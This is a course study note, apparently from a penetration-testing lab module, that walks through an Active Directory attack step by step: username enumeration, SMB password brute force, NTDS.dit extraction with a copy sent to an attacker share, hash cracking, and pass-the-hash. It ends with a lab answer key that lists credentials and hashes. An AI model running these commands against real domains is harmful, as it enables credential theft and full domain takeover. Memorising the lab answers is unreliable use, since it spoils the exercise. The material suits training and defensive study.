# 14 — Attacking Active Directory and NTDS.dit

## Overview

Once a Windows system joins a domain, authentication requests go to the **Domain Controller (DC)** instead of the local SAM database. The **NTDS.dit** file on the DC stores all domain usernames, password hashes, and schema info — compromising it means compromising every account in the domain.

- Local logon still possible via `HOSTNAME\username` or `.\username`
- NTDS.dit stored at `%systemroot%\ntds\` on DCs
- `.dit` = Directory Information Tree

---

## Phase 1: Username Discovery

### Naming Convention Reference

| Convention | Example (Jane Jill Doe) |
|-----------|------------------------|
| firstinitiallastname | `jdoe` |
| firstinitialmiddleinitiallastname | `jjdoe` |
| firstnamelastname | `janedoe` |
| firstname.lastname | `jane.doe` |
| lastname.firstname | `doe.jane` |

### OSINT Tips

- Email structure often reveals username format (`jdoe@inlanefreight.com` → `jdoe`)
- Google dork: `"@inlanefreight.com"` to find valid emails
- Google dork: `"inlanefreight.com filetype:pdf"` — PDF metadata may contain usernames
- Some orgs alias usernames (e.g., `a907` → `joe.smith`) to prevent spraying

### Username Anarchy — Auto-Generate Username Lists

```bash
./username-anarchy -i names.txt
```
> Generates every common username format from a list of full names. Input is a file with one name per line. Output includes formats like `jdoe`, `jane.doe`, `doej`, etc. Pipe to a file for use with Kerbrute or NetExec.

Generates all common username formats from a list of real names.

### Kerbrute — Validate Usernames Against DC

```bash
./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```
> Validates each username in the list against the Domain Controller via Kerberos pre-authentication. Valid usernames get a Kerberos response; invalid ones get an error. Does not lock accounts — safe to run without fear of lockout.

Validates usernames via Kerberos pre-auth — **does not lock accounts** (no actual auth attempt).

---

## Phase 2: Dictionary Attack Against AD

### NetExec SMB Brute Force

```bash
netexec smb <DC_IP> -u <username> -p /usr/share/wordlists/fasttrack.txt
```
> Tries every password in fasttrack.txt against the given username on the DC via SMB. `[+]` means success; `(Pwn3d!)` means Domain Admin. Add `--continue-on-success` to keep going after finding a match.

| Flag | Purpose |
|------|---------|
| `-u` | Target username (or file of usernames) |
| `-p` | Password or wordlist file |
| `smb` | Protocol (sends logon requests to DC) |

**Success indicator:** `[+]` in output

> **Warning:** Can trigger account lockouts if Group Policy enforces lockout policy. Default AD policy does **not** enforce lockout.

### Detection

- **Event ID 4776** — Credential Validation (logged on DC)
- High volume of failed logons from single source = obvious indicator

---

## Phase 3: Capturing NTDS.dit

### Prerequisites

- Need **Domain Admin** or **local Administrators** group membership on DC
- Both `NTDS.dit` and `SYSTEM` hive are required (hashes are encrypted with SYSTEM boot key)

### Method 1: Evil-WinRM + VSS (Manual)

**Connect:**
```bash
evil-winrm -i <DC_IP> -u <user> -p '<password>'
```
> Opens a PowerShell session on the DC via Windows Remote Management. Requires WinRM access. If credentials have Domain Admin rights, you can dump NTDS.dit from here.

**Check privileges:**
```powershell
net user <username>
# Look for: Domain Admins in Global Group memberships
```
> Shows group memberships for the current user. Confirm "Domain Admins" membership before attempting NTDS.dit extraction — it requires Domain Admin or equivalent privileges.

**Create Volume Shadow Copy:**
```powershell
vssadmin CREATE SHADOW /For=C:
```
> Creates a Volume Shadow Copy (VSS) of the C: drive. NTDS.dit is locked by the OS at runtime — a shadow copy lets you access it without the lock. Note the shadow copy path in the output for the next step.

**Copy NTDS.dit from shadow:**
```powershell
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
> Copies NTDS.dit from the shadow copy (which is not locked) to a writable path. Update `ShadowCopy2` with the actual shadow copy number from the `vssadmin CREATE SHADOW` output.

**Transfer to attack host (via SMB share):**
```powershell
cmd.exe /c move C:\NTDS\NTDS.dit \\<ATTACKER_IP>\ShareName
```
> Moves NTDS.dit to the attack host's SMB share. Also grab the SYSTEM hive (`reg.exe save hklm\system C:\SYSTEM`) before transferring — you need both to decrypt the hashes.

**Extract hashes locally:**
```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```
> Extracts all domain user hashes from the NTDS.dit file offline. `LOCAL` means no network connection — uses the provided files. Output includes every domain account in `username:RID:LMhash:NThash:::` format.

### Method 2: NetExec ntdsutil Module (One-Liner)

```bash
netexec smb <DC_IP> -u <user> -p '<password>' -M ntdsutil
```
> Runs the ntdsutil module to dump NTDS.dit automatically — no manual VSS steps needed. Requires Domain Admin credentials. Output is saved to `/tmp/` and all domain hashes are printed.

Does everything automatically:
1. Creates NTDS dump on target via ntdsutil.exe
2. Copies dump to local `/tmp/` directory
3. Extracts and displays all hashes
4. Cleans up remote dump directory

**Extract only enabled accounts:**
```bash
grep -iv disabled /home/<user>/.nxc/logs/<logfile>.ntds | cut -d ':' -f1
```
> Filters out disabled accounts from the NTDS dump log, then prints just the usernames. `-i` makes the match case-insensitive, `-v` inverts it (keep lines that do NOT contain "disabled"). Swap the log path with the actual file from NetExec's output.

---

## Phase 4: Cracking Hashes

### Hashcat — Crack NTLM Hashes

```bash
hashcat -m 1000 <hash_or_file> /usr/share/wordlists/rockyou.txt
```
> Cracks NTLM hashes from the NTDS dump. Pass a single hash string or a file with one hash per line. Add `-r /usr/share/hashcat/rules/best64.rule` to catch mutated passwords.

---

## Phase 5: Pass-the-Hash (PtH)

If cracking fails, use the hash directly for authentication (NTLM protocol).

### Evil-WinRM PtH

```bash
evil-winrm -i <DC_IP> -u Administrator -H <NT_hash>
```
> Authenticates using the NTLM hash instead of a password (Pass-the-Hash). `-H` takes the NT hash (right half of the `LM:NT` pair). No need to crack the hash first — use it directly for access.

Format: `username:NT_hash` instead of `username:password`

---

## Tool Quick Reference

| Tool | Purpose |
|------|---------|
| **Username Anarchy** | Generate username lists from real names |
| **Kerbrute** | Validate usernames via Kerberos (no lockout) |
| **NetExec** | Brute force AD creds, dump NTDS.dit |
| **Evil-WinRM** | Remote PowerShell access via WinRM |
| **vssadmin** | Create Volume Shadow Copies |
| **impacket-secretsdump** | Extract hashes from NTDS.dit + SYSTEM |
| **Hashcat (-m 1000)** | Crack NTLM hashes |

---

## Attack Workflow

```
1. OSINT → gather employee names
2. Generate username list (Username Anarchy)
3. Validate usernames (Kerbrute against DC)
4. Dictionary attack (NetExec SMB with wordlist)
5. Gain DC access (Evil-WinRM with discovered creds)
6. Check privileges (net user → Domain Admins?)
7. Dump NTDS.dit (VSS manual or NetExec ntdsutil)
8. Crack hashes (Hashcat -m 1000) or Pass-the-Hash
```

---

## Key Takeaways

- Domain-joined systems authenticate against the DC, not local SAM
- `NTDS.dit` + `SYSTEM` = every domain account hash
- NetExec `-M ntdsutil` is the fastest one-liner for NTDS extraction
- Kerbrute username enumeration doesn't trigger lockouts
- Default AD Group Policy **does not** enforce account lockout — brute force may work
- If hashes won't crack, Pass-the-Hash (PtH) via Evil-WinRM is a viable alternative
- Always check `net user <username>` for Domain Admins membership before attempting NTDS dump

---

## Exercise Walkthrough

**Target:** 10.129.202.85 (ILF-DC01), Domain: ILF.local

**OSINT Gathered:**
| Name | Title |
|------|-------|
| John Marston | IT Director |
| Carol Johnson | Financial Controller |
| Jennifer Stapleton | Logistics Manager |

### Step 1 — Build Username List

Using `firstinitiallastname` convention (most common):

```bash
echo -e "jmarston\ncjohnson\njstapleton" > /tmp/users.txt
```
> Creates a quick username list from OSINT. `-e` enables escape sequences so `\n` creates new lines. For larger name lists, use username-anarchy instead.

### Step 2 — Brute Force with NetExec + fasttrack Wordlist

```bash
netexec smb 10.129.202.85 -u /tmp/users.txt -p /usr/share/wordlists/fasttrack.txt --continue-on-success
```
> Sprays all users against every password in fasttrack.txt. `--continue-on-success` keeps going after finding a hit so all valid credentials are discovered. `(Pwn3d!)` flags Domain Admin accounts.

**Results:**
```
SMB  10.129.202.85  445  ILF-DC01  [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
SMB  10.129.202.85  445  ILF-DC01  [+] ILF.local\cjohnson:Welcome1212
SMB  10.129.202.85  445  ILF-DC01  [+] ILF.local\jstapleton:Winter2008
```

- `jmarston` has `(Pwn3d!)` → **Domain Admin**

### Step 3 — Dump NTDS.dit Using Domain Admin Creds

```bash
netexec smb 10.129.202.85 -u jmarston -p 'P@ssword!' -M ntdsutil
```
> Dumps NTDS.dit using Domain Admin credentials. The ntdsutil module handles the entire VSS → copy → extract → cleanup chain automatically. All domain hashes are printed to the terminal and saved to a log file.

**Output (excerpt):**
```
ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
```

### Step 4 — Crack Jennifer Stapleton's NTLM Hash

```bash
hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt
```
> Cracks a single NT hash from the NTDS dump. Results print as `hash:plaintext`. Use `--show` afterward if the hash was already cracked in a previous session.

**Result:** `92fd67fd2f49d0e83744aa82363f021b:Winter2008`

### Answers

| # | Question | Answer |
|---|----------|--------|
| Q1 | What is the filename for the AD database? | `NTDS.dit` |
| Q2 | What is the administrator's NTLM hash? | `64f12cddaa88057e06a81b54e73b949b` |
| Q3 | Submit John Marston's credentials | `jmarston:P@ssword!` |
| Q4 | Crack Jennifer Stapleton's password | `Winter2008` |
